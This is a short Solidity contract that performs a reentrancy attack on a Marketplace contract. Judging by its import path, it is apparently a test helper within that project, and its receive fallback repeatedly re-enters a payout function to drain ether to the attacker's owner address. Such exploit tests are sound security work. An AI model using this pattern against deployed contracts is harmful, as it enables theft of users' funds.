// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Marketplace} from "../../src/Marketplace.sol";

contract ReentrancyAttack {
    Marketplace public marketplace;
    address public owner;

    constructor(address _marketplace) {
        marketplace = Marketplace(_marketplace);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(marketplace).balance >= 1 ether) {
            marketplace.payoutContracts(0);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        marketplace.sendContract{value: msg.value}(owner, 1);
        marketplace.acceptContract(0);
        marketplace.freelancerSatisfyContract(0);
        marketplace.payoutContracts(0);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
